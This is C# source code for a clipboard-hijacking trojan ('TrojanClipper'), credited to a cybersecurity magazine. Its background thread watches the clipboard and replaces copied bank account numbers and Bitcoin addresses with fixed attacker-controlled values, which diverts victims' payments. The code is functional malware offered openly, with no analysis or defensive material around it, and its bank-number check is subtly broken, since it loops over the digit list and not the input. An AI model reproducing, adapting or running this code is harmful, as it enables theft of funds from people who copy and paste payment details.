using System;
using System.Linq;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

/* © ethical.blue Magazine // Cybersecurity clarified. */

namespace Clipper
{
    internal class TrojanClipper
    {
        private bool ClipperIsEnabled = false;
        private const string bankAccountNumber = "01 0101 0010 1011 1110 0100 1100";
        private const string bitcoinWalletAddress = "1REPLACEDBitcoinAddr3ssHereX1evzn3";
        private string clipboardText = string.Empty;
        private int jitter = 100;
        private readonly Random random = new Random();
        private Thread ClipperThread = null;

        internal async Task StartClipper()
        {
            if(ClipperThread is null)
            {
                ClipperThread = new Thread(ClipperMethod);
                ClipperThread.SetApartmentState(ApartmentState.STA);
                ClipperThread.IsBackground = true;
                ClipperThread.Start();
            }

            ClipperIsEnabled = true;

            await Task.CompletedTask;
        }

        internal async Task StopClipper()
        {
            ClipperIsEnabled = false;

            await Task.CompletedTask;
        }

        private async void ClipperMethod()
        {
            while (true)
            {
                if (ClipperIsEnabled == false)
                {
                    jitter = random.Next(0, 25);
                    Thread.Sleep(jitter);
                    continue;
                }
                    

                await CheckClipboardForBankAccountNumber();
                await CheckClipboardForBitcoinAddress();

                jitter = random.Next(0, 25);
                Thread.Sleep(jitter);
            }
        }

        private async Task CheckClipboardForBankAccountNumber()
        {
            var currentText = Clipboard.GetText(TextDataFormat.UnicodeText);

            if (currentText == clipboardText)
                return;

            var result = await IsValidBankAccountNumber(currentText);

            if (result.IsValid == false)
                return;

            var bankAccountNumberNew = result.ContainsSpaceCharacters
                ? bankAccountNumber
                : bankAccountNumber.Replace(" ", "");

            Clipboard.SetText(bankAccountNumberNew, TextDataFormat.UnicodeText);

            clipboardText = currentText;
        }

        private async Task<BankAccountNumberType> IsValidBankAccountNumber(string accountNumber)
        {
            if (accountNumber.Length != 26 && accountNumber.Length != 32)
                return await Task.FromResult(new BankAccountNumberType(false, false));

            const string accountNumberCharacters = "1234567890";

            foreach (var c in accountNumberCharacters)
            {
                if (accountNumberCharacters.Contains(c) == false)
                    return await Task.FromResult(new BankAccountNumberType(false, false));
            }

            return await Task.FromResult(new BankAccountNumberType(true, accountNumber.Contains(' ')));
        }

        private async Task CheckClipboardForBitcoinAddress()
        {
            var currentText = Clipboard.GetText(TextDataFormat.UnicodeText);

            if (currentText == clipboardText)
                return;

            var valid = await IsValidBitcoinAddress(currentText);

            if (valid)
                Clipboard.SetText(bitcoinWalletAddress, TextDataFormat.UnicodeText);

            clipboardText = currentText;
        }

        private async Task<bool> IsValidBitcoinAddress(string address)
        {
            const int minLength = 27;
            const int maxLength = 34;

            if (address.Length < minLength || address.Length > maxLength)
                return await Task.FromResult(false);

            const string walletCharacters = "1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";

            foreach (var c in address)
            {
                if (walletCharacters.Contains(c) == false)
                    return await Task.FromResult(false);
            }

            return await Task.FromResult(true);
        }
    }

    internal class BankAccountNumberType
    {
        internal BankAccountNumberType(bool isValid, bool containsSpaceCharacters)
        {
            IsValid = isValid;
            ContainsSpaceCharacters = containsSpaceCharacters;
        }

        internal bool IsValid { get; set; }
        internal bool ContainsSpaceCharacters { get; set; }
    }
}
